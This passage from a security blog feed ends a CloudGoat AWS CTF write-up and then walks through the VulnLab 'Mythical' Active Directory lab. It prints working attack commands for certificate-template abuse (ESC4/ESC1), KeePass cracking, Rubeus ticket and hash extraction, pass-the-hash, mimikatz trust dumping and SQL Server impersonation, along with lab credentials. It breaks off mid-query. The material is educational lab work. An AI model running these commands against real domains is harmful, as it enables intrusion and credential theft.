cgidmws70jym0c_final_flag</span><br><span class="line">[secrets__enum] Probing parameter store</span><br><span class="line">[secrets__enum] secrets__enum completed.</span><br><span class="line"></span><br><span class="line">[secrets__enum] MODULE SUMMARY:</span><br><span class="line">    1 Secret(s) were found in AWS secretsmanager</span><br><span class="line">    0 Parameter(s) were found in AWS Systems Manager Parameter Store</span><br><span class="line">    Check ~/.local/share/pacu/&lt;session name&gt;/downloads/secrets/ to get the values</span><br></pre></td></tr></table></figure><p>The flag was: <code>FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}</code></p><h2 id="Key-Lessons-Learned"><a href="#Key-Lessons-Learned" class="headerlink" title="Key Lessons Learned"></a>Key Lessons Learned</h2><ol><li><strong>Environment Variable Exposure:</strong> Storing sensitive credentials in plaintext environment variables is a dangerous practice that can lead to privilege escalation.</li><li><strong>Lateral Movement:</strong> I leveraged one set of credentials to discover another, ultimately leading to admin access.</li><li><strong>Access Key Creation:</strong> The ability to create access keys for other users is extremely powerful and should be tightly controlled.</li><li><strong>Targeted Enumeration:</strong> Focusing on the service mentioned in the scenario (Elastic Beanstalk) paid off and directed the exploitation path.</li></ol><p>This CTF challenge demonstrates a realistic AWS attack path that security professionals might encounter in real-world penetration tests. Understanding these attack vectors is crucial for cloud security practitioners to properly secure their AWS environments.</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Mythical</title>
      <link href="/2025/04/21/VL-Mythical/"/>
      <url>/2025/04/21/VL-Mythical/</url>
      
        <content type="html"><![CDATA[<h1 id="Mythical-CHAIN-A-Multi-Domain-Active-Directory-Penetration-Testing-Adventure"><a href="#Mythical-CHAIN-A-Multi-Domain-Active-Directory-Penetration-Testing-Adventure" class="headerlink" title="Mythical CHAIN: A Multi-Domain Active Directory Penetration Testing Adventure"></a>Mythical CHAIN: A Multi-Domain Active Directory Penetration Testing Adventure</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll guide you through exploiting the “Mythical CHAIN” network infrastructure, showcasing a realistic enterprise penetration testing scenario across multiple Windows domains. Starting with an assumed breach position, we’ll leverage a Mythic C2 agent to discover and exploit a chain of vulnerabilities including vulnerable certificate templates (ESC4&#x2F;ESC1), Active Directory domain trusts, and SQL Server privilege escalation techniques. This penetration test demonstrates advanced lateral movement, credential harvesting, and domain privilege escalation tactics while highlighting the importance of proper certificate template security and trust relationship configurations in Active Directory environments.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Starting with our first machine discovery:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.mythical-us.vl</span><br><span class="line">| Issuer: commonName=dc01.mythical-us.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-11-28T15:12:13</span><br><span class="line">| Not valid after:  2025-05-30T15:12:13</span><br><span class="line">| MD5:   ba60:dfbc:1933:a166:8d8b:c162:b60f:7716</span><br><span class="line">| SHA-1: 666e:a128:ab04:d46a:5610:1836:8eb8:e4f8:bf5d:76bf</span><br></pre></td></tr></table></figure><p>Second machine port scan results:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</span><br><span class="line">80/tcp   open  http     syn-ack ttl 63 Golang net/http server</span><br><span class="line">7443/tcp open  ssl/http syn-ack ttl 62 nginx 1.25.5</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-title: 400 The plain HTTP request was sent to HTTPS port</span><br><span class="line">|_Requested resource was /new/login</span><br><span class="line">| ssl-cert: Subject: organizationName=Mythic</span><br><span class="line">| Issuer: organizationName=Mythic</span><br><span class="line">| Public Key type: ec</span><br><span class="line">| Public Key bits: 384</span><br><span class="line">| Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">| Not valid before: 2024-11-24T15:26:17</span><br><span class="line">| Not valid after:  2025-11-24T15:26:17</span><br><span class="line">| MD5:   bc51:3614:2940:10c1:3fc7:fb2b:f260:7b09</span><br><span class="line">| SHA-1: a844:a1a0:9f51:4d03:6d59:00cd:3fe4:2811:d1ec:d967</span><br><span class="line">|_-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure><p>Third machine details:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: MYTHICAL-EU</span><br><span class="line">|   NetBIOS_Domain_Name: MYTHICAL-EU</span><br><span class="line">|   NetBIOS_Computer_Name: DC02</span><br><span class="line">|   DNS_Domain_Name: mythical-eu.vl</span><br><span class="line">|   DNS_Computer_Name: dc02.mythical-eu.vl</span><br><span class="line">|   DNS_Tree_Name: mythical-eu.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-19T19:16:53+00:00</span><br><span class="line">|_ssl-date: 2025-04-19T19:17:00+00:00; -1h59m43s from scanner time.</span><br></pre></td></tr></table></figure><h2 id="Initial-Access-Mythic-C2"><a href="#Initial-Access-Mythic-C2" class="headerlink" title="Initial Access - Mythic C2"></a>Initial Access - Mythic C2</h2><p>Accessing the Mythic C2 interface at: <code>https://&lt;Machine 2 IP&gt;:7443/new/login</code><br><img src="/images/Mythical/mythic.png" alt="Mythic C2 Login Interface"><br>From the assumed breach, we received these credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mythic_admin : wG4jmjNcEcfmzv3QbEcJdSVTDEjCnX</span><br></pre></td></tr></table></figure><h2 id="Command-Execution-and-Enumeration"><a href="#Command-Execution-and-Enumeration" class="headerlink" title="Command Execution and Enumeration"></a>Command Execution and Enumeration</h2><p>After logging in, we begin sending commands to our agent:<br><img src="/images/Mythical/sending_commands.png" alt="Sending Commands via Mythic"><br>First, we change directory to the user’s home folder:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_assembly SharpHound.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly SharpHound.exe -c All</span><br></pre></td></tr></table></figure><p>Then wait for SharpHound to finish and download the results:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download 20250419124353_BloodHound.zip</span><br></pre></td></tr></table></figure><p>We send our data to BloodHound Community Edition (BHCE) for analysis. For reference on installing BHCE with Docker, see: <a href="https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf">https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf</a><br>From BloodHound analysis, we discover that user Momo has RDP access:<br><img src="/images/Mythical/momo_can_rdp.png" alt="Momo Can RDP"></p><h2 id="Network-Share-Enumeration"><a href="#Network-Share-Enumeration" class="headerlink" title="Network Share Enumeration"></a>Network Share Enumeration</h2><p>Let’s find what shares we have access to. First, we need to navigate to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\_admin\cwrsync\bin</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/rsync_executable.png" alt="RSync Executable Location"><br>List available shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell rsync.exe --list-only rsync://192.168.25.1</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/shares.png" alt="Available Shares"><br>Now we’ll create a folder and copy the contents of the mythical share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mkdir \hello</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell rsync -av rsync://192.168.25.1/mythical /</span><br></pre></td></tr></table></figure><p>We discover a flag:<br><img src="/images/Mythical/flag.png" alt="Flag Found"></p><h2 id="Credential-Recovery"><a href="#Credential-Recovery" class="headerlink" title="Credential Recovery"></a>Credential Recovery</h2><p>To download the <code>it.kdbx</code> file, we click the actions button and then download. The agent sends a task and the response enables downloading the file.<br>KeePass version 4 requires special handling as <code>keepass2john</code> doesn’t support it. We’ll use a GitHub repository with a bash script for brute-forcing:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/r3nt0n/keepass4brute</span><br></pre></td></tr></table></figure><p>From the wiki, we know the password should be in one of the smaller rockyou lists:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./keepass4brute.sh ../it.kdbx /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/found_pass.png" alt="Password Found"><br>Inside the KeePass database, we find credentials for a user named <code>domjoin</code>:<br><img src="/images/Mythical/keepass.png" alt="KeePass Contents"></p><h2 id="Certificate-Template-Exploitation"><a href="#Certificate-Template-Exploitation" class="headerlink" title="Certificate Template Exploitation"></a>Certificate Template Exploitation</h2><p>Let’s check for vulnerable certificate templates. We’ll use Certify, which needs to be compiled for Windows (Visual Studio 2019 with .NET 4):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_assembly Certify.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p>Output reveals a vulnerable template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[!] Vulnerable Certificates Templates :</span><br><span class="line"></span><br><span class="line">    CA Name                               : dc01.mythical-us.vl\mythical-us-DC01-CA</span><br><span class="line">    Template Name                         : Machine</span><br><span class="line">    Schema Version                        : 1</span><br><span class="line">    Validity Period                       : 1 year</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN</span><br><span class="line">    mspki-enrollment-flag                 : AUTO_ENROLLMENT</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : Client Authentication, Server Authentication</span><br><span class="line">    mspki-certificate-application-policy  : &lt;null&gt;</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br></pre></td></tr></table></figure><p>We’ve identified an ESC4 vulnerability. To exploit it, we’ll impersonate the domjoin user:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token mythical-us\domjoin &lt;PASS&gt;</span><br></pre></td></tr></table></figure><p>Next, we’ll upload StandIn to create a computer account and join the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_assembly StandIn_v13_Net45.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly StandIn_v13_Net45.exe --computer panosoiko --make</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/machine_account.png" alt="Machine Account Created"><br>Impersonate the machine account we created:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token mythical-us\panosoiko$ zgbyv9HgwnfF2QV</span><br></pre></td></tr></table></figure><p>With our machine account context, we’ll convert the ESC4 vulnerability to ESC1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly StandIn_v13_Net45.exe --ADCS --filter Machine --ess --add</span><br></pre></td></tr></table></figure><p>Successfully added the msPKI-Certificate-Name-Flag to the certificate. Now add Certificate Enrollment Permissions to the <code>Domain Users</code> group:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly StandIn_v13_Net45.exe --ADCS --filter Machine --ntaccount</span><br><span class="line">&quot;mythical-us\domain users&quot; --enroll --add</span><br></pre></td></tr></table></figure><p>Now exploit the ESC1 vulnerability using Certify:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly Certify.exe request /ca:dc01.mythical-us.vl\mythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/domain_users.png" alt="Domain Users Added"></p><h2 id="Certificate-to-NTLM-Hash"><a href="#Certificate-to-NTLM-Hash" class="headerlink" title="Certificate to NTLM Hash"></a>Certificate to NTLM Hash</h2><p>Load Rubeus for ticket manipulation:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_assembly Rubeus.exe</span><br></pre></td></tr></table></figure><p>Save the Certify output to a cert.pem file and convert it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure><p>Upload the certificate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload -File (path)cert.pfx</span><br></pre></td></tr></table></figure><p>Use Rubeus to extract the Administrator’s NTLM hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly Rubeus.exe asktgt /user:Administrator /certificate:c:\users\momo.ayase\admin.pfx /ptt /nowrap /getcredentials|</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/administrator_hash.png" alt="Administrator Hash Retrieved"><br>Obtained hash: <code>C583EF48C5ED66NOPENOPENOPE</code><br>Since Mimikatz didn’t work, we’ll use Invoke-SMBExec.ps1 to trigger the agent with admin privileges:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username administrator -Hash &lt;HASH&gt; -Command &quot;c:\programdata\google\update.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/system_shell.png" alt="System Shell Obtained"></p><h2 id="Domain-Trust-Exploitation"><a href="#Domain-Trust-Exploitation" class="headerlink" title="Domain Trust Exploitation"></a>Domain Trust Exploitation</h2><p>After uploading Mimikatz again, we’ll dump the domain trust information to explore the relationship with DC02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/mimikatz.exe &quot;lsadump::trust /patch&quot;</span><br></pre></td></tr></table></figure><p>Output reveals trust details:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Domain: MYTHICAL-EU.VL (MYTHICAL-EU / S-1-5-21-1148612195-3581135157-3534241443)</span><br><span class="line"> [  In ] MYTHICAL-US.VL -&gt; MYTHICAL-EU.VL</span><br><span class="line"></span><br><span class="line"> [ Out ] MYTHICAL-EU.VL -&gt; MYTHICAL-US.VL</span><br><span class="line">    * 4/20/2025 7:02:21 AM - CLEAR   - e6 39 a6 04 66 75 38 7d 33 a6 13 ce 4f 66 cf f9 fc 9f c4 79 6d f7 cc 0a 0e 51 5a 34 59 5a e9 79 4f ad 90 d6 c1 95 47 66 00 fe 65 02 4c b4 b3 8e 8f b1 31 07 af 43 5e 39 be 1a aa ac ed 06 70 3a 86 5c 48 76 3d f5 f5 a8 f2 57 08 fd 42 0a 6d 32 3b f6 5e 5f ac 62 94 4b 91 e7 d8 3c 3e ea c8 b4 07 f8 f7 ce 35 8a 99 8c 60 23 b4 df 63 fc a5 5a a7 57 26 da 76 eb 22 ec f7 4b e2 55 21 7c 6a 43 65 3f fd 1b 43 49 53 9f 5e 14 e4 c6 13 42 af 93 a1 4d 24 07 f8 91 28 10 d6 b7 70 59 ac fb c2 f7 22 aa d0 d7 f2 2c c2 24 cb 44 b0 3b 64 89 46 a8 9b 9c 78 ef 7f 5e e1 7d 11 5d 1f 98 4c 12 8b dd 89 5d c5 2b ce 8c eb ff bb 76 0e 2a 98 0c 0b 51 b8 c3 5e 74 2d 7a 87 4d 6b 67 4a 0c 45 4f b6 fe a9 05 2f 60 2b c9 bf 76 ba 78 7a 66 89 61 29 52 </span><br><span class="line">* aes256_hmac       a1757854f414bcd2aefc48cd445abae179806110cf763f255b5032f36ae4f1c3</span><br><span class="line">* aes128_hmac       f9b024c28fee48b95fd0fc27546affc9</span><br><span class="line">* rc4_hmac_nt       d96d7d0a04d48ee91ab49a97c012fefd</span><br><span class="line"></span><br><span class="line"> [ In-1] MYTHICAL-US.VL -&gt; MYTHICAL-EU.VL</span><br><span class="line"></span><br><span class="line"> [Out-1] MYTHICAL-EU.VL -&gt; MYTHICAL-US.VL</span><br><span class="line">    * 4/20/2025 7:02:21 AM - CLEAR   - a1 39 02 5e 0a 3d ce c0 af c9 6a ab 1c ea 0a 0a 7e 3f 20 d2 ea f6 95 93 c2 9f f8 7e </span><br><span class="line">* aes256_hmac       cecbd91e50ff3ee7fbd725fbe9e2f3ea4d4445e549100607c3f2239307391076</span><br><span class="line">* aes128_hmac       652888ee3ab5fac7ea1ebf84e423d59d</span><br><span class="line">* rc4_hmac_nt       eb921a2b0e9d626559dab0f54fdc6498</span><br></pre></td></tr></table></figure><p>Additional trust information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Direction               : Outbound</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=mythical-eu.vl,CN=System,DC=mythical-us,DC=vl</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : mythical-eu.vl</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : 03ce402a-bf80-4b34-81dd-53cbe802337d</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : True</span><br><span class="line">Source                  : DC=mythical-us,DC=vl</span><br><span class="line">Target                  : mythical-eu.vl</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : 4</span><br><span class="line">TrustedPolicy           : </span><br><span class="line">TrustingPolicy          : </span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure><p>We discover that users from mythical-eu.vl can authenticate to mythical-us.vl, but not vice versa - a one-way trust. Following GitHub guidance, we exploit trust accounts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly -Assembly Rubeus.exe -Arguments asktgt /user:mythical-us$ /domain:mythical-eu.vl /rc4:d96d7d0a04d48ee91ab49a97c012fefd /nowrap /ptt</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/trust_acc.png" alt="Trust Account Access"><br>Now we can enumerate users on mythical-eu.vl:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell get-aduser -Filter * -Server mythical-eu.vl -Properties *</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-aduser -Filter * -Server &quot;dc02.mythical-eu.vl&quot; -Property DisplayName, SamAccountName | Select-Object DisplayName, SamAccountName0</span><br></pre></td></tr></table></figure><p>Results reveal service accounts that might be exploitable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">DisplayName      SamAccountName  </span><br><span class="line">-----------      --------------  </span><br><span class="line">                 Administrator        </span><br><span class="line">Wendy Adams      Wendy.Adams     </span><br><span class="line">William Jennings William.Jennings</span><br><span class="line">Julie Khan       Julie.Khan      </span><br><span class="line">Alan Rhodes      Alan.Rhodes     </span><br><span class="line">Jay Little       Jay.Little      </span><br><span class="line">Owen Dunn        Owen.Dunn       </span><br><span class="line">Howard Frost     Howard.Frost    </span><br><span class="line">Naomi Campbell   Naomi.Campbell  </span><br><span class="line">Judith Smith     Judith.Smith    </span><br><span class="line">Nicholas Hill    Nicholas.Hill   </span><br><span class="line">Karl Kaur        Karl.Kaur       </span><br><span class="line">Hilary Pearson   Hilary.Pearson  </span><br><span class="line">Marcus Elliott   Marcus.Elliott  </span><br><span class="line">Fiona Knight     Fiona.Knight    </span><br><span class="line">Jay Miller       Jay.Miller      </span><br><span class="line">Josephine Smith  Josephine.Smith </span><br><span class="line">Mohammad Jones   Mohammad.Jones  </span><br><span class="line">Glen Price       Glen.Price      </span><br><span class="line">Amber Hussain    Amber.Hussain   </span><br><span class="line">Megan Higgins    Megan.Higgins   </span><br><span class="line">Donald Burton    Donald.Burton   </span><br><span class="line">Jasmine Smith    Jasmine.Smith   </span><br><span class="line">Kim Byrne        Kim.Byrne       </span><br><span class="line">Jack Chambers    Jack.Chambers   </span><br><span class="line">Danielle Andrews Danielle.Andrews</span><br><span class="line">svc_ldap         svc_ldap        </span><br><span class="line">svc_sql          svc_sql         </span><br><span class="line">root             root            </span><br></pre></td></tr></table></figure><p>The svc_sql and svc_ldap accounts look promising. We search for SPNs but find none:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-ADUser -Filter &#123;ServicePrincipalName -ne &quot;$null&quot;&#125; -Properties ServicePrincipalName -Server dc02.mythical-eu.vl | Select Name, ServicePrincipalName</span><br></pre></td></tr></table></figure><h2 id="DC02-Share-Enumeration"><a href="#DC02-Share-Enumeration" class="headerlink" title="DC02 Share Enumeration"></a>DC02 Share Enumeration</h2><p>Let’s search through DC02 shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net view \\dc02.mythical-eu.vl\</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/shares_dc02.png" alt="DC02 Shares"><br>We spot a non-standard “dev” share. Let’s explore it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls \\dc02.mythical-eu.vl\dev</span><br></pre></td></tr></table></figure><p>We find:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Autologon64.exe</span><br><span class="line">getusers.exe</span><br></pre></td></tr></table></figure><p>Using DNSpy to analyze these executables, we discover credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_ldap : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/cleartext_forsvc_ldap.png" alt="Cleartext Password for svc_ldap"></p><h2 id="Port-Scanning-and-SQL-Server-Access"><a href="#Port-Scanning-and-SQL-Server-Access" class="headerlink" title="Port Scanning and SQL Server Access"></a>Port Scanning and SQL Server Access</h2><p>Using PortScanner to check for MSSQL ports on DC02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly -Assembly PortScanner.exe -Arguments hosts=10.10.161.167 ports=1433,1434 timeout=3000</span><br></pre></td></tr></table></figure><p>We find port 1433 open, indicating MSSQL is running. Password spraying reveals svc_sql has the same password as svc_ldap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_token mythical-eu\svc_sql &lt;PASS&gt;</span><br></pre></td></tr></table></figure><p>Upload sqlcmd and rename it to avoid issues:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -Source C:/Users/Administrator/sqlcmd.exe -Destination C:/Users/Administrator/sql.exe</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/change_the_Name.png" alt="SQL Command Tool Renamed"><br>Successfully connecting to SQL Server:<br><img src="/images/Mythical/boom_sql_acces.png" alt="SQL Server Access"><br>Attempting to enable xp_cmdshell fails due to insufficient permissions:<br><img src="/images/Mythical/no_cmd_shell.png" alt="No Command Shell Access"></p><h2 id="SQL-Server-Privilege-Escalation"><a href="#SQL-Server-Privilege-Escalation" class="headerlink" title="SQL Server Privilege Escalation"></a>SQL Server Privilege Escalation</h2><p>Checking our current privileges:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br></pre></td></tr></table></figure><p>We attempt to find users we can impersonate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id 